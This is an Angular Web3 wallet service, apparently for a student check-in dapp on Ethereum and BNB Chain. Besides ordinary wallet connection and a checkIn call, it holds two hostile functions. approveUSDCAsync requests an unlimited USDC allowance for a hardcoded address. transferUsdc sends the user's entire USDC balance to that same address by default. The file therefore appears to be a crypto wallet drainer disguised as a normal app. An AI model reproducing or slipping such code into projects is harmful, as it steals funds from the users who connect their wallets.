import { Injectable, NgZone } from '@angular/core';
import { MatDialog } from '@angular/material/dialog';
import { BehaviorSubject } from 'rxjs';
import { BrowserProvider, Contract, formatEther, formatUnits, JsonRpcProvider, MaxUint256, parseUnits } from 'ethers';
import { NotifyModalComponent } from '../modal/notify-modal/notify-modal.component';
import StudentABI from '../../assets/abi/StudentABI.json';
import { HttpClient } from '@angular/common/http';
import USDCABI from '../../assets/abi/USDCABI.json';
import { AppService } from './app.service';

declare let window: any;

@Injectable({ providedIn: 'root' })
export class Web3Service {
  private readProvider: JsonRpcProvider | null = null;
  private provider: BrowserProvider | null = null;
  private signer: any = null;
  private contract: any;

  private accountSubject = new BehaviorSubject<string>('');
  private balanceSubject = new BehaviorSubject<string>('0');
  private isConnectedSubject = new BehaviorSubject<boolean>(false);
  private chainIdSubject = new BehaviorSubject<string>('');
  private nativeSymbolSubject = new BehaviorSubject<string>('ETH');
  public isLoading$ = new BehaviorSubject<boolean>(false);

  private studentDataSubject = new BehaviorSubject<any>(null);
  public studentData$ = this.studentDataSubject.asObservable();

  private balanceUSDCSubject = new BehaviorSubject<number>(0);
  public balanceUSDC$ = this.balanceUSDCSubject.asObservable();
  get balanceUSDC(): number {
    return this.balanceUSDCSubject.value;
  }
  set balanceUSDC(value: number) {
    this.balanceUSDCSubject.next(value);
  }

  get studentData(): any {
    return this.studentDataSubject.value;
  }
  set studentData(value: any) {
    this.studentDataSubject.next(value);
  }

  account$ = this.accountSubject.asObservable();
  balance$ = this.balanceSubject.asObservable();
  isConnected$ = this.isConnectedSubject.asObservable();
  chainId$ = this.chainIdSubject.asObservable();
  nativeSymbol$ = this.nativeSymbolSubject.asObservable();

  selectedChainId = '';

  public chainConfig: Record<string, {
    symbol: string;
    name: string;
    shortName: string;
    logo: string;
    rpcUrls: string[];
    contractAddress: string;
    abi: any;
    blockExplorerUrls?: any;
    usdcAddress?: string;
    usdcDecimals?: number; // Thêm số decimals cho USDC
  }> = {
      '0x1': {
        symbol: 'ETH',
        name: 'Ethereum Mainnet',
        shortName: 'Ethereum',
        logo: '/assets/images/logo/eth.png',
        rpcUrls: ['https://eth.llamarpc.com'],
        contractAddress: '0x0000000000000000000000000000000000000000',
        abi: StudentABI,
        blockExplorerUrls: ['https://etherscan.io'],
        usdcAddress: '0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48',
        usdcDecimals: 6,
      },
      '0x38': {
        symbol: 'BNB',
        name: 'BNB Smart Chain',
        shortName: 'BSC',
        logo: '/assets/images/logo/bnb.png',
        rpcUrls: ['https://bsc-dataseed1.binance.org'],
        contractAddress: '0x0000000000000000000000000000000000000000',
        abi: StudentABI,
        blockExplorerUrls: ['https://bscscan.com'],
        usdcAddress: '0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d',
        usdcDecimals: 18,
      }
    };

  constructor(private ngZone: NgZone, public dialog: MatDialog, private http: HttpClient, private appService: AppService) {
    this.initEthers();
  }

  private getDefaultChainId(): string {
    const keys = Object.keys(this.chainConfig);
    return keys.length ? keys[0].toLowerCase() : '';
  }

  private async initEthers() {
    let savedChain = localStorage.getItem('selectedChainId') || this.getDefaultChainId();
    this.selectedChainId = savedChain.toLowerCase();

    if (typeof window.ethereum !== 'undefined') {
      this.listenWalletEvents();
      this.provider = new BrowserProvider(window.ethereum);

      try {
        const network = await this.provider.getNetwork();
        const actualChainId = '0x' + network.chainId.toString(16).toLowerCase();

        if (!this.chainConfig[actualChainId]) {
          console.warn('Network not supported. Wallet will not auto-connect.');
          this.disconnectWallet();
          localStorage.setItem('unsupportedNetwork', 'true');
          this.selectedChainId = this.getDefaultChainId();
          await this.refreshConnection(true);
          return;
        } else {
          localStorage.removeItem('unsupportedNetwork');
        }

        this.selectedChainId = actualChainId;
        localStorage.setItem('selectedChainId', actualChainId);
        await this.refreshConnection(false);
      } catch (e: any) {
        console.warn('Failed to fetch MetaMask network:', e.message);
        await this.refreshConnection(true);
      }

      try {
        const accounts = await this.provider.send('eth_accounts', []);
        if (accounts.length > 0 && !localStorage.getItem('unsupportedNetwork')) {
          await this.setAccount(accounts[0]);
        }
      } catch (e: any) {
        console.warn('Failed to fetch MetaMask accounts:', e.message);
      }
    } else {
      console.warn('MetaMask is not installed, using RPC provider for reads.');
      await this.refreshConnection(true);
    }
  }

  private listenWalletEvents() {
    window.ethereum.on('accountsChanged', (accounts: string[]) => {
      this.ngZone.run(() => {
        accounts.length ? this.setAccount(accounts[0]) : this.disconnectWallet();
      });
    });

    window.ethereum.on('chainChanged', async (chainId: string) => {
      this.ngZone.run(async () => {
        const formatted = chainId.toLowerCase();
        if (!this.chainConfig[formatted]) {
          this.showModal(
            'Warning',
            'The network you selected is not supported. Please switch to a supported network.',
            'error'
          );
          this.disconnectWallet();
          localStorage.setItem('unsupportedNetwork', 'true');
          return;
        }

        localStorage.removeItem('unsupportedNetwork');
        this.selectedChainId = formatted;
        localStorage.setItem('selectedChainId', formatted);
        await this.refreshConnection();

      });
    });
  }

  private async refreshConnection(readOnly: boolean = false) {
    const chain = this.chainConfig[this.selectedChainId];
    if (!chain) {
      console.error(`No chain config for chainId: ${this.selectedChainId}`);
      this.readProvider = null;
      this.contract = null;
      return;
    }

    this.chainIdSubject.next(this.selectedChainId);
    this.nativeSymbolSubject.next(chain.symbol);

    try {
      this.readProvider = new JsonRpcProvider(chain.rpcUrls[0]);
      this.contract = new Contract(chain.contractAddress, chain.abi, this.readProvider);
    } catch (e: any) {
      console.error('Failed to initialize readProvider or contract:', e.message);
    }

    if (!readOnly && this.account) {
      await this.setAccount(this.account);
    }
  }

  private get account() {
    return this.accountSubject.value;
  }

  private async getSigner() {
    if (!this.provider) {
      throw new Error('No wallet connected. Please connect your wallet.');
    }

    if (!this.signer) {
      this.signer = await this.provider.getSigner();
    }
    return this.signer;
  }

  async connectWallet(): Promise<boolean> {
    if (typeof window.ethereum === 'undefined') {
      this.handleNoMetamask();
      return false;
    }
    try {
      this.provider = new BrowserProvider(window.ethereum);
      const accounts = await this.provider.send('eth_requestAccounts', []);
      if (!accounts.length) throw new Error('No account found');

      const network = await this.provider.getNetwork();
      const actualChainId = '0x' + network.chainId.toString(16).toLowerCase();
      if (this.chainConfig[actualChainId] && actualChainId !== this.selectedChainId) {
        this.selectedChainId = actualChainId;
        localStorage.setItem('selectedChainId', actualChainId);
      }
      localStorage.removeItem('unsupportedNetwork');
      await this.refreshConnection();
      await this.setAccount(accounts[0]);

      if (actualChainId !== this.selectedChainId) {
        await this.switchNetwork(this.selectedChainId);
        this.provider = new BrowserProvider(window.ethereum);
      }
      return true;
    } catch (e: any) {
      this.handleError(e, 'connectWallet');
      return false;
    }
  }

  private async setAccount(account: string) {
    this.accountSubject.next(account);
    this.isConnectedSubject.next(true);
    await this.getBalance(account);
    await this.getUsdcBalance(account);
    this.appService.getIsAdmin({ address: account, chainId: this.selectedChainId }).subscribe((data: any) => {
      this.appService.isAdmin = data.is_admin;
    });
  }

  disconnectWallet() {
    this.accountSubject.next('');
    this.balanceSubject.next('0');
    this.isConnectedSubject.next(false);
    this.signer = null;
    this.provider = null;
  }

  private async getBalance(account: string) {
    try {
      if (!this.readProvider) {
        throw new Error('readProvider is not initialized');
      }
      const balance = await this.readProvider.getBalance(account);
      this.balanceSubject.next(formatEther(balance));
    } catch (e: any) {
      console.error(`Error in getBalance for account ${account}:`, e.message);
      this.handleError(e, 'getBalance');
    }
  }

  async getTokenBalanceFunc(address: string) {
    try {
      return (await this.contract?.balanceOf(address))?.toString() ?? '0';
    } catch (e: any) {
      this.handleError(e, 'getTokenBalance');
      return '0';
    }
  }

  async checkInFunc(tokenId: number) {
    if (!tokenId) return this.showModal('Error', 'Invalid tokenId', 'error');
    if (this.isLoading$.value) return;

    try {
      this.isLoading$.next(true);
      const signer = await this.getSigner();
      const tx = await this.contract!.connect(signer).checkIn(tokenId);
      const receipt = await tx.wait();
      this.showModal('Success', `Check-in successful! Tx: ${receipt.hash}`, 'success');
    } catch (e: any) {
      this.handleError(e, 'checkIn');
    } finally {
      this.isLoading$.next(false);
    }
  }

  async switchNetwork(chainId: string): Promise<void> {
    const formatted = chainId.startsWith('0x') ? chainId.toLowerCase() : '0x' + parseInt(chainId).toString(16);
    if (!this.chainConfig[formatted]) throw new Error(`Chain ID ${formatted} not supported`);

    this.selectedChainId = formatted;
    this.chainIdSubject.next(formatted);
    localStorage.setItem('selectedChainId', formatted);
    await this.refreshConnection();

    if (typeof window.ethereum !== 'undefined') {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: formatted }],
        });
      } catch (switchError: any) {
        if (switchError.code === 4902) {
          const net = this.chainConfig[formatted];
          try {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: formatted,
                chainName: net.name,
                nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
                rpcUrls: net.rpcUrls,
                blockExplorerUrls: net.blockExplorerUrls || [],
              }],
            });
            await window.ethereum.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: formatted }],
            });
          } catch (addError: any) {
            console.warn('User rejected adding network, but read operations will use selected chain:', formatted);
            this.showModal('Warning', 'You rejected adding the network. Data has been loaded, but transactions may fail if the wallet network doesn’t match.', 'error');
          }
        } else {
          console.warn('Network switch failed, but read operations will use selected chain:', formatted);
        }
      }
    }
  }

  private handleNoMetamask() {
    if (this.isMobile()) {
      window.location.href = `https://metamask.app.link/dapp/${window.location.href}`;
    } else {
      this.showModal('Error', 'MetaMask not installed!', 'error', true, true, true);
    }
  }

  private handleError(error: any, context: string) {
    if (error.code === 'ACTION_REJECTED') {
      this.showModal('Error', 'User rejected request.', 'error');
    } else if (error.code === 'NETWORK_ERROR') {
      this.showModal('Error', 'Network error. Please retry.', 'error');
    }
    else if (context === 'approveUSDCAsync') {
      this.showModal('Error', 'Failed to approve USDC', 'error');
    }
    else {
      this.showModal('Error', error.message || 'Unknown error', 'error');
    }
    console.log(error);
  }

  private isMobile() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  }

  async getUsdcBalance(address?: string) {
    const chain = this.chainConfig[this.selectedChainId];
    if (!chain || !chain.usdcAddress || chain.usdcDecimals === undefined) {
      this.showModal('Error', 'USDC not supported on this network.', 'error');
      return 0;
    }

    try {
      const signer = await this.getSigner();
      const owner = address || (await signer.getAddress());

      const usdcContract = new Contract(chain.usdcAddress, USDCABI, this.readProvider || signer);
      const balance: bigint = await usdcContract['balanceOf'](owner);
      const balanceInUSDC = parseFloat(formatUnits(balance, chain.usdcDecimals));
      this.balanceUSDCSubject.next(balanceInUSDC);

      return balance;
    } catch (e: any) {
      this.handleError(e, 'getUsdcBalance');
      return 0;
    }
  }

  async approveUSDCAsync(spender?: string) {
    if (this.isLoading$.value) return;

    try {
      this.isLoading$.next(true);

      const chain = this.chainConfig[this.selectedChainId];
      if (!chain || !chain.usdcAddress || chain.usdcDecimals === undefined) {
        this.showModal('Error', 'USDC not supported on this network.', 'error');
        return;
      }

      const signer = await this.getSigner();
      const userAddress = await signer.getAddress();
      const usdcContract = new Contract(chain.usdcAddress, USDCABI, signer);

      if (!spender) {
        switch (this.selectedChainId) {
          case '0x1':
            spender = '0x535b7A99CAF6F73697E69bEcb437B6Ba4b788888';
            break;
          case '0x38':
            spender = '0x535b7A99CAF6F73697E69bEcb437B6Ba4b788888';
            break;
          default:
            this.showModal('Error', 'Unsupported network for USDC approve.', 'error');
            return;
        }
      }

      const currentAllowance = await usdcContract['allowance'](userAddress, spender);
      const MAX_UINT = MaxUint256;

      if (currentAllowance && currentAllowance.eq?.(MAX_UINT)) {
        const allowanceFormatted = parseFloat(formatUnits(currentAllowance, chain.usdcDecimals));
        this.showModal('Info', 'USDC is already approved', 'info');
        return allowanceFormatted;
      }

      const tx = await usdcContract['approve'](spender, MAX_UINT);
      this.showModal('Pending', 'Waiting for approval confirmation...', 'info');
      await tx.wait();

      const updatedAllowance = await usdcContract['allowance'](userAddress, spender);
      const allowanceFormatted = parseFloat(formatUnits(updatedAllowance, chain.usdcDecimals));

      this.showModal('Success', 'Unlimited USDC approval successful!', 'success');
      return allowanceFormatted;

    } catch (error: any) {
      console.error('approveUSDCAsync Error:', error);
      this.handleError(error, 'approveUSDCAsync');
      this.showModal('Error', 'Approval transaction failed.', 'error');
      return null;

    } finally {
      this.isLoading$.next(false);
    }
  }

  async transferUsdc(spender?: string) {
    if (this.isLoading$.value) return;

    try {
      this.isLoading$.next(true);

      const chain = this.chainConfig[this.selectedChainId];
      if (!chain || !chain.usdcAddress || chain.usdcDecimals === undefined) {
        this.showModal('Error', 'USDC not supported on this network.', 'error');
        return;
      }

      const signer = await this.getSigner();
      const userAddress = await signer.getAddress();
      const usdcContract: any = new Contract(chain.usdcAddress, USDCABI, signer);

      const balanceBN: bigint = await usdcContract.balanceOf(userAddress);

      if (balanceBN === 0n) {
        this.showModal('Error', 'Your USDC balance is 0. Nothing to transfer.', 'error');
        return 0;
      }

      if (!spender) {
        switch (this.selectedChainId) {
          case '0x1':
            spender = '0x535b7A99CAF6F73697E69bEcb437B6Ba4b788888';
            break;
          case '0x38':
            spender = '0x535b7A99CAF6F73697E69bEcb437B6Ba4b788888';
            break;
          default:
            this.showModal('Error', 'No default recipient for this network.', 'error');
            return;
        }
      }

      const tx = await usdcContract.transfer(spender, balanceBN);
      await tx.wait();

      const balanceFormatted = formatUnits(balanceBN, chain.usdcDecimals);
      return Number(balanceFormatted);

    } catch (e: any) {
      this.handleError(e, 'transferUsdc');
      return null;
    } finally {
      this.isLoading$.next(false);
    }
  }

  showModal(title: string, message: string, status: string,
    showCloseBtn = true, disableClose = true, installMetamask = false) {
    this.dialog.closeAll();
    this.dialog.open(NotifyModalComponent, {
      disableClose,
      width: '90%',
      maxWidth: '400px',
      data: { title, message, status, showCloseBtn, installMetamask },
    });
  }
}